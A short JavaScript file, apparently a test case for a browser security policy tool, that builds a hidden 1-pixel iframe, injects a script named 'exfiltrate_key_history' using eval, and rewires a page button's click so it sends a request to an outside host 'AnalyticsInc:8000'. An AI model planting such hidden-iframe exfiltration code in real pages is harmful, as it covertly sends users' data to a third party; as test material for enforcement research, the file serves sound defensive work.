// tamper_iframe.js
function click_inner() {
  var event$$1 = new Event("click");
  document.getElementById("test2").dispatchEvent(event$$1);
  return
}
var pol = document.head.childNodes[5];
var tx = document.head.childNodes[7];
var button = document.getElementById("test");
var button2 = button.cloneNode(true);
button2.id = "test2";
var script = document.createElement("script");
JAM.set(script, "innerHTML", "function exfiltrate_key_history() {var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open(\"GET\", \"http://AnalyticsInc:8000/submission.html?test=iframe\", true);xmlhttp.send(null);';eval(exp);}document.getElementById('test2').onclick = exfiltrate_key_history;");
var frm = document.createElement("iframe");
JAM.call(frm.setAttribute, frm, ["id", "ifrm"]);
JAM.call(frm.setAttribute, frm, ["src", "JavaScript:''"]);
frm.style.width = "1px";
frm.style.height = "1px";
JAM.call(frm.appendChild, frm, [tx]);
JAM.call(frm.appendChild, frm, [button2]);
JAM.call(frm.appendChild, frm, [script]);
var v5 = document.body;
JAM.call(v5.appendChild, v5, [frm]);
JAM.set(document.getElementById("test"), "onclick", click_inner)
